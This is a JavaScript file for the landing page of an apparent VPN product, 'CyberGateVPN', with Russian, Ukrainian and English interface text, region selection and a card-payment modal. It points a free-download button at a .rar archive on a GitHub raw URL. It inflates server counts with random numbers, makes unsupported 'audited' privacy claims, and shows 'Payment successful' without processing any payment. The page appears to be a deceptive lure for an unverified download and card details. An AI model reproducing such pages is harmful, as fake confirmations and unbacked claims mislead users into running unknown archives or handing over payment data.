const DOWNLOAD_URL = 'https://github.com/CyberGateVpn/CyberGateVPN.github.io/raw/refs/heads/main/CyberGate.rar';

const translations = {
  ru: {
    nav_features: "Возможности",
    nav_pricing: "Цены",
    nav_download: "Скачать",
    nav_support: "Поддержка",
    hero_subtitle: "Обеспечьте свою цифровую свободу",
    hero_desc: "Шифрование военного уровня - Политика без логов - Молниеносная скорость",
    hero_btn_protected: "Получить защиту",
    hero_btn_download: "Скачать бесплатно",
    map_title: "Глобальная зашифрованная сеть",
    map_live: "АКТИВНЫЕ ЗАШИФРОВАННЫЕ СОЕДИНЕНИЯ",
    features_title: "Почему CyberGateVPN?",
    feature1_title: "Политика без логов",
    feature1_desc: "Проверено аудитом. Ваши данные принадлежат только вам.",
    feature2_title: "Сверхбыстрый",
    feature2_desc: "Серверы 10 Гбит/с - протокол WireGuard.",
    feature3_title: "Военное шифрование",
    feature3_desc: "AES-256 + ChaCha20 для максимальной безопасности.",
    pricing_title: "Выберите план",
    plan_free_name: "Бесплатный",
    plan_free_duration: "1 Месяц",
    plan_free_desc: "Базовая защита",
    plan_free_btn: "Начать бесплатно",
    plan_premium_name: "Премиум",
    plan_premium_duration: "3 Года",
    plan_premium_desc: "Все функции разблокированы",
    plan_premium_btn: "Получить Премиум",
    plan_lifetime_name: "Пожизненный",
    plan_lifetime_duration: "Навсегда",
    plan_lifetime_desc: "Одноразовый платёж",
    plan_lifetime_btn: "Купить навсегда",
    download_title: "Скачать бесплатную версию",
    download_subtitle: "Выберите регион для подключения (демо-доступ)",
    download_btn: "Скачать бесплатно",
    download_regions_available: "Доступно регионов",
    download_no_reg: "Без регистрации",
    card_number: "Номер карты",
    card_name: "Имя владельца",
    card_expiry: "ММ/ГГ",
    card_cvv: "CVV",
    email: "Email",
    payment_btn: "Завершить безопасный платёж",
    payment_cancel: "Отмена",
    footer_text: "2025 CyberGateVPN. Все права защищены. Цифровая свобода.",
    region_germany: "Германия: 32 сервера - высокая скорость",
    region_netherlands: "Нидерланды: 28 серверов - низкий пинг",
    region_japan: "Япония: 35 серверов - азиатский хаб",
    region_singapore: "Сингапур: 40 серверов - оптимизация для стримов",
    region_canada: "Канада: 27 серверов - североамериканский узел",
    region_switzerland: "Швейцария: 33 сервера - максимальная конфиденциальность",
    free_access: "Бесплатный доступ: 30+ виртуальных локаций",
    download_start: "Загрузка CyberGate.rar начинается..."
  },
  ua: {
    nav_features: "Можливості",
    nav_pricing: "Ціни",
    nav_download: "Завантажити",
    nav_support: "Підтримка",
    hero_subtitle: "Забезпечте свою цифрову свободу",
    hero_desc: "Шифрування військового рівня - Політика без логів - Блискавична швидкість",
    hero_btn_protected: "Отримати захист",
    hero_btn_download: "Завантажити безкоштовно",
    map_title: "Глобальна зашифрована мережа",
    map_live: "АКТИВНІ ЗАШИФРОВАНІ З'ЄДНАННЯ",
    features_title: "Чому CyberGateVPN?",
    feature1_title: "Політика без логів",
    feature1_desc: "Перевірено аудитом. Ваші дані належать лише вам.",
    feature2_title: "Надшвидкий",
    feature2_desc: "Сервери 10 Гбіт/с - протокол WireGuard.",
    feature3_title: "Військове шифрування",
    feature3_desc: "AES-256 + ChaCha20 для максимальної безпеки.",
    pricing_title: "Оберіть план",
    plan_free_name: "Безкоштовний",
    plan_free_duration: "1 Місяць",
    plan_free_desc: "Базовий захист",
    plan_free_btn: "Почати безкоштовно",
    plan_premium_name: "Преміум",
    plan_premium_duration: "3 Роки",
    plan_premium_desc: "Всі функції розблоковано",
    plan_premium_btn: "Отримати Преміум",
    plan_lifetime_name: "Довічний",
    plan_lifetime_duration: "Назавжди",
    plan_lifetime_desc: "Одноразовий платіж",
    plan_lifetime_btn: "Купити назавжди",
    download_title: "Завантажити безкоштовну версію",
    download_subtitle: "Оберіть регіон для підключення (демо-доступ)",
    download_btn: "Завантажити безкоштовно",
    download_regions_available: "Доступно регіонів",
    download_no_reg: "Без реєстрації",
    card_number: "Номер картки",
    card_name: "Ім'я власника",
    card_expiry: "ММ/РР",
    card_cvv: "CVV",
    email: "Email",
    payment_btn: "Завершити безпечний платіж",
    payment_cancel: "Скасувати",
    footer_text: "2025 CyberGateVPN. Всі права захищені. Цифрова свобода.",
    region_germany: "Німеччина: 32 сервери - висока швидкість",
    region_netherlands: "Нідерланди: 28 серверів - низький пінг",
    region_japan: "Японія: 35 серверів - азійський хаб",
    region_singapore: "Сінгапур: 40 серверів - оптимізація для стримів",
    region_canada: "Канада: 27 серверів - північноамериканський вузол",
    region_switzerland: "Швейцарія: 33 сервери - максимальна конфіденційність",
    free_access: "Безкоштовний доступ: 30+ віртуальних локацій",
    download_start: "Завантаження CyberGate.rar починається..."
  },
  eu: {
    nav_features: "Features",
    nav_pricing: "Pricing",
    nav_download: "Download",
    nav_support: "Support",
    hero_subtitle: "Secure Your Digital Freedom",
    hero_desc: "Military-grade encryption - No-logs policy - Blazing fast speeds",
    hero_btn_protected: "Get Protected Now",
    hero_btn_download: "Free Download",
    map_title: "Global Encrypted Network",
    map_live: "LIVE ENCRYPTED CONNECTIONS",
    features_title: "Why CyberGateVPN?",
    feature1_title: "No Logs Policy",
    feature1_desc: "Audited and independently verified. Your data stays yours.",
    feature2_title: "Ultra Fast",
    feature2_desc: "10 Gbps servers - WireGuard protocol included.",
    feature3_title: "Military Encryption",
    feature3_desc: "AES-256 + ChaCha20 for maximum security.",
    pricing_title: "Choose Your Plan",
    plan_free_name: "Free",
    plan_free_duration: "1 Month",
    plan_free_desc: "Basic protection",
    plan_free_btn: "Start Free",
    plan_premium_name: "Premium",
    plan_premium_duration: "3 Years",
    plan_premium_desc: "All features unlocked",
    plan_premium_btn: "Get Premium",
    plan_lifetime_name: "Lifetime",
    plan_lifetime_duration: "Forever",
    plan_lifetime_desc: "One-time payment",
    plan_lifetime_btn: "Buy Lifetime",
    download_title: "Download Free Version",
    download_subtitle: "Choose a region for connection (demo access)",
    download_btn: "Download Free",
    download_regions_available: "Available regions",
    download_no_reg: "No registration",
    card_number: "Card Number",
    card_name: "Cardholder Name",
    card_expiry: "MM/YY",
    card_cvv: "CVV",
    email: "Email",
    payment_btn: "Complete Secure Payment",
    payment_cancel: "Cancel",
    footer_text: "2025 CyberGateVPN. All rights reserved. Digital freedom.",
    region_germany: "Germany: 32 servers - high speed",
    region_netherlands: "Netherlands: 28 servers - low ping",
    region_japan: "Japan: 35 servers - Asian hub",
    region_singapore: "Singapore: 40 servers - stream optimized",
    region_canada: "Canada: 27 servers - North American node",
    region_switzerland: "Switzerland: 33 servers - maximum privacy",
    free_access: "Free access: 30+ virtual locations",
    download_start: "CyberGate.rar download starting..."
  }
};

let currentLang = 'ru';

function switchLanguage(lang) {
  currentLang = lang;
  
  document.querySelectorAll('.lang-btn').forEach(btn => {
    btn.classList.remove('active');
    if (btn.dataset.lang === lang) {
      btn.classList.add('active');
    }
  });

  document.querySelectorAll('[data-i18n]').forEach(element => {
    const key = element.dataset.i18n;
    if (translations[lang] && translations[lang][key]) {
      element.textContent = translations[lang][key];
    }
  });

  document.querySelectorAll('[data-i18n-placeholder]').forEach(element => {
    const key = element.dataset.i18nPlaceholder;
    if (translations[lang] && translations[lang][key]) {
      element.placeholder = translations[lang][key];
    }
  });

  updateRegionDescription();
  updateModalPlanText();
}

function updateModalPlanText() {
  const modalPlan = document.getElementById('modalPlan');
  if (modalPlan) {
    if (translations[currentLang]) {
      modalPlan.textContent = translations[currentLang].payment_btn || 'Payment';
    }
  }
}

document.querySelectorAll('.lang-btn').forEach(btn => {
  btn.addEventListener('click', function() {
    switchLanguage(this.dataset.lang);
  });
});

const regionDetails = {
  'Germany': 'region_germany',
  'Netherlands': 'region_netherlands',
  'Japan': 'region_japan',
  'Singapore': 'region_singapore',
  'Canada': 'region_canada',
  'Switzerland': 'region_switzerland'
};

const regionChips = document.querySelectorAll('.region-chip');
const regionDescription = document.getElementById('region-description');
const activeRegionCountSpan = document.getElementById('activeRegionCount');

function updateRegionDescription() {
  const activeChip = document.querySelector('.region-chip.active');
  if (activeChip) {
    const region = activeChip.getAttribute('data-region');
    const translationKey = regionDetails[region];
    if (translations[currentLang] && translations[currentLang][translationKey]) {
      regionDescription.textContent = translations[currentLang][translationKey];
    } else if (translations[currentLang] && translations[currentLang]['free_access']) {
      regionDescription.textContent = translations[currentLang]['free_access'];
    }
  }
  
  const randomAdd = Math.floor(Math.random() * 5);
  const availableText = currentLang === 'ru' ? 'доступно' : currentLang === 'ua' ? 'доступно' : 'available';
  activeRegionCountSpan.textContent = '30+' + (randomAdd > 0 ? ' (' + (30+randomAdd) + ' ' + availableText + ')' : '');
}

regionChips.forEach(chip => {
  chip.addEventListener('click', function(e) {
    regionChips.forEach(c => c.classList.remove('active'));
    this.classList.add('active');
    updateRegionDescription();
  });
});

window.addEventListener('DOMContentLoaded', () => {
  switchLanguage('ru');
  updateRegionDescription();
});

document.getElementById('downloadFreeBtn').addEventListener('click', function(e) {
  const activeRegion = document.querySelector('.region-chip.active')?.getAttribute('data-region') || 'Germany';
  const messages = {
    ru: 'Загрузка CyberGate.rar начинается...\nВыбран регион: ' + activeRegion + '\nФайл загружается с GitHub.',
    ua: 'Завантаження CyberGate.rar починається...\nОбраний регіон: ' + activeRegion + '\nФайл завантажується з GitHub.',
    eu: 'CyberGate.rar download starting...\nSelected region: ' + activeRegion + '\nFile downloading from GitHub.'
  };
  
  console.log(`Download started: ${DOWNLOAD_URL}`);
  console.log(`Region: ${activeRegion}`);
  
  setTimeout(() => {
    alert(messages[currentLang] || messages.eu);
  }, 500);
});

function scrollToPricing() {
  document.getElementById('pricing').scrollIntoView({ behavior: 'smooth' });
}

function scrollToDownload() {
  document.getElementById('download-free').scrollIntoView({ behavior: 'smooth' });
}

function showPayment(plan) {
  const modal = document.getElementById('paymentModal');
  const planTitle = document.getElementById('modalPlan');
  const planNames = {
    ru: { free: 'Бесплатная версия - 1 Месяц', premium: 'Премиум доступ - 3 Года', lifetime: 'Пожизненный доступ' },
    ua: { free: 'Безкоштовна версія - 1 Місяць', premium: 'Преміум доступ - 3 Роки', lifetime: 'Довічний доступ' },
    eu: { free: 'Free Version - 1 Month', premium: 'Premium Access - 3 Years', lifetime: 'Lifetime Access' }
  };
  planTitle.innerText = planNames[currentLang] ? planNames[currentLang][plan] : planNames.eu[plan];
  modal.style.display = 'flex';
}

function completePayment() {
  const messages = {
    ru: 'Оплата прошла успешно! Защита CyberGateVPN активирована.',
    ua: 'Оплата пройшла успішно! Захист CyberGateVPN активовано.',
    eu: 'Payment successful! Your CyberGateVPN protection is now active.'
  };
  alert(messages[currentLang] || messages.eu);
  closeModal();
}

function closeModal() {
  document.getElementById('paymentModal').style.display = 'none';
}

window.onclick = function(event) {
  const modal = document.getElementById('paymentModal');
  if (event.target === modal) {
    modal.style.display = 'none';
  }
}

console.log("%cCyberGateVPN Loaded", "color:#00f0ff; font-size:18px; font-weight:bold;");
console.log("%cDownload URL: " + DOWNLOAD_URL, "color:#c026d3;");
console.log("%cRegions: Free(30+), Premium(75+), Lifetime(110+)", "color:#c026d3;");
